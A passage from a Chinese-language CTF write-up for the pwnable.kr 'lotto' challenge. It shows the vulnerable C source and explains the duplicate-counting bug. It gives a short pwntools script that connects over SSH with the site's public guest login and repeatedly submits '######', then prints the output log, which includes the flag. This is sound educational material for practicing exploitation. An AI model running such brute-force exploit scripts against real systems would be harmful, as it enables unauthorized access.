</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">lotto</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">lotto</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">6</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;error2. tell admin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="n">lotto</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">lotto</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">%</span> <span class="mi">45</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>         <span class="c1">// 1 ~ 45
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// calculate lotto score
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">match</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span><span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">j</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span><span class="p">(</span><span class="n">lotto</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">submit</span><span class="p">[</span><span class="n">j</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">                                <span class="n">match</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// win!
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">match</span> <span class="o">==</span> <span class="mi">6</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;bad luck...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">help</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;- nLotto Rule -</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;nlotto is consisted with 6 random natural numbers less than 46</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;your goal is to match lotto numbers as many as you can</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;if you win lottery for *1st place*, you will get reward</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;for more details, follow the link below</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;mathematical chance to win this game is known to be 1/8145060.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// menu
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">menu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">		        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;- Select Menu -</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;1. Play Lotto</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;2. Help</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;3. Exit</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">menu</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">switch</span><span class="p">(</span><span class="n">menu</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                        <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                                <span class="nf">play</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                                <span class="nf">help</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;bye</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;invalid menu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>看这段:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span><span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">j</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span><span class="p">(</span><span class="n">lotto</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">submit</span><span class="p">[</span><span class="n">j</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">                                <span class="n">match</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>原本应该是lotto和submit按顺序一一对应, 但是这段代码写成了对于lotto中的每一位, 只要submit中有x个与它相同就会使match+x. 这大大降低了枚举难度. 我们只要认死一个1~45中的字符, 比如&rsquo;#&rsquo;, 一直输入
&ldquo;######&rdquo;, 只要随机出的lotto中有一个#, 就可以让match+6, 从而得到flag.
不会写代码识别flag, 所以我只能人工盯着屏幕看了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;pwnable.kr&#39;</span><span class="p">,</span><span class="n">user</span><span class="o">=</span><span class="s1">&#39;lotto&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">2222</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;guest&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./lotto&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;######&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="c1"># s.interactive()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以看到得到flag还是很快的, 看到flag就可以ctrl+c结束脚本了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span><span class="lnt">313
</span><span class="lnt">314
</span><span class="lnt">315
</span><span class="lnt">316
</span><span class="lnt">317
</span><span class="lnt">318
</span><span class="lnt">319
</span><span class="lnt">320
</span><span class="lnt">321
</span><span class="lnt">322
</span><span class="lnt">323
</span><span class="lnt">324
</span><span class="lnt">325
</span><span class="lnt">326
</span><span class="lnt">327
</span><span class="lnt">328
</span><span class="lnt">329
</span><span class="lnt">330
</span><span class="lnt">331
</span><span class="lnt">332
</span><span class="lnt">333
</span><span class="lnt">334
</span><span class="lnt">335
</span><span class="lnt">336
</span><span class="lnt">337
</span><span class="lnt">338
</span><span class="lnt">339
</span><span class="lnt">340
</span><span class="lnt">341
</span><span class="lnt">342
</span><span class="lnt">343
</span><span class="lnt">344
</span><span class="lnt">345
</span><span class="lnt">346
</span><span class="lnt">347
</span><span class="lnt">348
</span><span class="lnt">349
</span><span class="lnt">350
</span><span class="lnt">351
</span><span class="lnt">352
</span><span class="lnt">353
</span><span class="lnt">354
</span><span class="lnt">355
</span><span class="lnt">356
</span><span class="lnt">357
</span><span class="lnt">358
</span><span class="lnt">359
</span><span class="lnt">360
</span><span class="lnt">361
</span><span class="lnt">362
</span><span class="lnt">363
</span><span class="lnt">364
</span><span class="lnt">365
</span><span class="lnt">366
</span><span class="lnt">367
</span><span class="lnt">368
</span><span class="lnt">369
</span><span class="lnt">370
</span><span class="lnt">371
</span><span class="lnt">372
</span><span class="lnt">373
</span><span class="lnt">374
</span><span class="lnt">375
</span><span class="lnt">376
</span><span class="lnt">377
</span><span class="lnt">378
</span><span class="lnt">379
</span><span class="lnt">380
</span><span class="lnt">381
</span><span class="lnt">382
</span><span class="lnt">383
</span><span class="lnt">384
</span><span class="lnt">385
</span><span class="lnt">386
</span><span class="lnt">387
</span><span class="lnt">388
</span><span class="lnt">389
</span><span class="lnt">390
</span><span class="lnt">391
</span><span class="lnt">392
</span><span class="lnt">393
</span><span class="lnt">394
</span><span class="lnt">395
</span><span class="lnt">396
</span><span class="lnt">397
</span><span class="lnt">398
</span><span class="lnt">399
</span><span class="lnt">400
</span><span class="lnt">401
</span><span class="lnt">402
</span><span class="lnt">403
</span><span class="lnt">404
</span><span class="lnt">405
</span><span class="lnt">406
</span><span class="lnt">407
</span><span class="lnt">408
</span><span class="lnt">409
</span><span class="lnt">410
</span><span class="lnt">411
</span><span class="lnt">412
</span><span class="lnt">413
</span><span class="lnt">414
</span><span class="lnt">415
</span><span class="lnt">416
</span><span class="lnt">417
</span><span class="lnt">418
</span><span class="lnt">419
</span><span class="lnt">420
</span><span class="lnt">421
</span><span class="lnt">422
</span><span class="lnt">423
</span><span class="lnt">424
</span><span class="lnt">425
</span><span class="lnt">426
</span><span class="lnt">427
</span><span class="lnt">428
</span><span class="lnt">429
</span><span class="lnt">430
</span><span class="lnt">431
</span><span class="lnt">432
</span><span class="lnt">433
</span><span class="lnt">434
</span><span class="lnt">435
</span><span class="lnt">436
</span><span class="lnt">437
</span><span class="lnt">438
</span><span class="lnt">439
</span><span class="lnt">440
</span><span class="lnt">441
</span><span class="lnt">442
</span><span class="lnt">443
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[+] Starting remote process bytearray(b&#39;./lotto&#39;) on pwnable.kr: pid 281220
</span></span><span class="line"><span class="cl">/home/juicymio/mycode/lotto.py:5: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
</span></span><span class="line"><span class="cl">  p.sendline(&#34;1&#34;)
</span></span><span class="line"><span class="cl">/home/juicymio/mycode/lotto.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
</span></span><span class="line"><span class="cl">  p.sendline(&#34;######&#34;)
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;sorry mom... I FORGOT to check duplicate numbers... :(\n&#39;  // 第一次出现flag在这
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
